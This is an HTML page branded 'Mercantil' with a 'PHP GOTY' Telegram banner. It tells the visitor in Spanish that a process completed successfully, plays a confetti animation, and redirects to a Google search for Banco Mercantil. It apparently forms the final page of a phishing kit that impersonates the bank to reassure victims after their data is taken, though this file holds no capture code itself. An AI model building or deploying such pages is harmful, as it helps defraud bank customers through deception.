<!--

██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 

Telegram: @PHPGOTY

-->
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mercantil</title>
  <meta http-equiv="refresh" content="6;url=https://www.google.com/search?q=banco+mercantil&rlz=1C1ALOY_esCO1087CO1087&oq=banco+mercantil&gs_lcrp=EgZjaHJvbWUqBwgAEAAYjwIyBwgAEAAYjwIyEggBEC4YQxjHARjRAxiABBiKBTIICAIQRRgnGDsyDQgDEC4YxwEY0QMYgAQyBggEEEUYOzIGCAUQRRg8MgYIBhBFGDwyBggHEEUYPNIBCDMzNjRqMGo0qAIAsAIA&sourceid=chrome&ie=UTF-8">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      background: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      font-family: Arial, sans-serif;
    }
    .loader-container {
      position: relative;
      width: 160px;
      height: 160px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .loader-ring {
      position: absolute;
      width: 100%;
      height: 100%;
      border: 2.5px solid #03bafc;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }
    .loader-image {
      width: 235px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loading-text {
      margin-top: 40px;
      font-size: 18px;
      color: #ff6f25;
      font-weight: bold;
    }
  </style>
</head>

  <body>
    <div class="loader-container">
      <img
        src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDB0cDBvYThoOHJhaWxvbzFhd2s2azJzb2VuM3B1OXAxM2pseTlmcyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/PijzuUzUhm7hcWinGn/giphy.gif"
        alt="Cargando"
        class="loader-image"
      />
    </div><br>
    <div class="loading-text">¡Enhorabuena proceso <br>completado con éxito!<span id="dots"></span></div>


    <canvas id="confetti-canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;"></canvas>

    <script>
    window.addEventListener('DOMContentLoaded', () => {
      const canvas = document.getElementById('confetti-canvas');
      const ctx = canvas.getContext('2d');
      let W = window.innerWidth;
      let H = window.innerHeight;
      canvas.width = W;
      canvas.height = H;

      const duration = 4500;
      const gravity = 0.25;
      const confettis = [];

      function randomColor() {
        const colors = ['#FFC700', '#FF0000', '#2E3192', '#41BBC7', '#A200FF'];
        return colors[Math.floor(Math.random() * colors.length)];
      }

      function createConfetti() {
        for (let i = 0; i < 8; i++) {
          confettis.push({
            x: W / 2,
            y: H / 2,
            r: Math.random() * 6 + 3,
            color: randomColor(),
            angle: Math.random() * 2 * Math.PI,
            speed: Math.random() * 2 + 1, // velocidad más lenta
            tilt: Math.random() * 10 - 5,
            tiltAngle: 0,
            tiltAngleIncrement: Math.random() * 0.08 + 0.05,
            alpha: 1
          });
        }
      }

      const startTime = performance.now();
      const emitter = setInterval(() => {
        if (performance.now() - startTime >= duration) {
          clearInterval(emitter);
        } else {
          createConfetti();
        }
      }, 100);

      function animate() {
        ctx.clearRect(0, 0, W, H);
        confettis.forEach((c, i) => {
          c.tiltAngle += c.tiltAngleIncrement;
          c.x += Math.cos(c.angle) * c.speed;
          c.y += Math.sin(c.angle) * c.speed + gravity;
          c.tilt = Math.sin(c.tiltAngle) * 10;
          c.alpha -= 0.005;

          ctx.beginPath();
          ctx.strokeStyle = c.color;
          ctx.globalAlpha = Math.max(c.alpha, 0);
          ctx.lineWidth = c.r / 2;
          ctx.moveTo(c.x + c.tilt, c.y);
          ctx.lineTo(c.x + c.tilt + c.r / 2, c.y + c.r);
          ctx.stroke();
        });

        ctx.globalAlpha = 1;
        requestAnimationFrame(animate);
      }

      animate();

      setTimeout(() => {
        confettis.length = 0;
        ctx.clearRect(0, 0, W, H);
      }, duration + 500);
    });
    </script>



</body>
</html>
